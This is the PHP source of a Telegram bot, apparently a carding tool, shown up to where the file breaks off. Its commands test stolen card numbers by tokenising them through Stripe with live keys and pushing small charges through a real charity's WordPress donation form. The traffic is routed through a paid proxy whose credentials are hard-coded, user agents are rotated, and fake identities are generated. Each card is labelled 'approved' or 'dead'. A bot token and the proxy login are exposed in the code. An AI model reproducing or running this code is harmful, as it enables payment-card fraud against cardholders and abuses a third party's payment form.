<?php

//https://api.telegram.org/bot<token>/setwebhook?url=<url>

$botToken = "5568873179:AAF6R6IK6AZZQwce49g-IMi3wUbAPPAjQPs"; // Enter your bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];


//==[Start Command]=========//

if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!</b>");
}

//==[Cmds Command]==//

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Stripe $1 Donation:</u> <code>!0chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Stripe $0.5 Charge:</u> <code>!chk2</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Stripe 500 INR Charge:</u> <code>!inr</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Stripe Auth:</u> <code>!auth</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info");
}

//////////=========[Info Command]==//

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username");
}


//==[Bin Command]==//

elseif ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
//$name = $fim['country']['alpha2']; ////country abbreviated example (US)
//$name = $fim['country']['name']; //// country
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
///$test2 = GetStr($fim, '"alpha2":"', '"'); ////country abbreviated example (US)
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
curl_close($ch);

 
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'');
}
curl_close($ch);

//==RANDOM USER AGENT==//
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua();



//==[Chk Command]==//

if ((strpos($message, "!0chk") === 0)||(strpos($message, "/0chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

//===[Randomizing Details]===//

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//=[1st REQ]=//

$proxyIP = 'isp2.hydraproxy.com:9989';

//The port that the proxy is listening on.
$proxyPort = '9989';

//The username for authenticating with the proxy.
$proxyUsername = 'saha44424wnhl118659';

//The password for authenticating with the proxy.
$proxyPassword = 'b9Jm8kt8Cyit0dNw';

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=35792&pasted_fields=number&guid=f718d0cc-5489-4c2b-8c28-04d1b06fbed8349167&muid=4bd2dd46-5e51-4bc9-8695-98ecbd77c6f739b9b5&sid=3d948a66-0639-40e2-bb7e-53256145e055c57144&key=pk_live_51IYmPsHxn2F7nVO7dyALP7JQH3sPhNAKtPtmYfeDzWQ1ytK5Jtg38ouXObsnI7GqWLdi3d4iPU28MLVEOFc3W14900pEGhlPMM&payment_user_agent=stripe.js%2F78ef418&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);

//=[2nd Req]=//

$ch = curl_init();

curl_setopt($ch, CURLOPT_PROXY, $proxyIP);

//Set the port.
curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);

//Specify the username and password.
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUsername:$proxyPassword");
curl_setopt($ch, CURLOPT_URL, 'https://www.harekrishnaperth.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "action=wp_full_stripe_payment_charge&formName=Community_Center_Project&fullstripe_email=$email&fullstripe_custom_amount=1&fullstripe_name=james+smith&stripeToken=$id");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: www.harekrishnaperth.com';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Cookie: trx_addons_is_retina=0; __stripe_sid=3d948a66-0639-40e2-bb7e-53256145e055c57144; __stripe_mid=4bd2dd46-5e51-4bc9-8695-98ecbd77c6f739b9b5';
$headers[] = 'Origin: https://www.harekrishnaperth.com';
$headers[] = 'Referer: https://www.harekrishnaperth.com/donate/';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
$headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result2 = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
    
curl_close($ch);


//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Payment Successful!')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Donated successfully')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CARD CHARGED✅ ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b> 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "requires_action")) || (strpos($result2, 'status": "requires_action'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ PROXY ERROR TRY AGAIN ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $1 Donation</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}

//==[Chk2 Command]==//

if ((strpos($message, "!chk2") === 0)||(strpos($message, "/chk2") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

//===[Randomizing Details]===//

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

# -------------------- [1 REQ] -------------------#


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[name]=james+smith&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=f718d0cc-5489-4c2b-8c28-04d1b06fbed8349167&muid=51b7b6e9-4cfd-4cf6-87cf-20ae41c0a0a47accd2&sid=aa0ee625-5390-4ca5-a50b-67bf3bfeb134b4bb9e&pasted_fields=number&payment_user_agent=stripe.js%2F85f802fd1%3B+stripe-js-v3%2F85f802fd1&time_on_page=522126&key=pk_live_51LsL26J80qXcneiEVe9nQgokBj6NJ80blK0m0Ym2QYSMB3AzyiYhdZbPkTQ4YgE6ZrzQBG1zjnKgnWHiiP7F7fAl00FEdW54Q1");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result1 = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);


$id = trim(strip_tags(getStr($result1,'"id": "','"')));


# -------------------- [2 REQ] -------------------#



$proxyIP = 'isp2.hydraproxy.com:9989';

//The port that the proxy is listening on.
$proxyPort = '9989';

//The username for authenticating with the proxy.
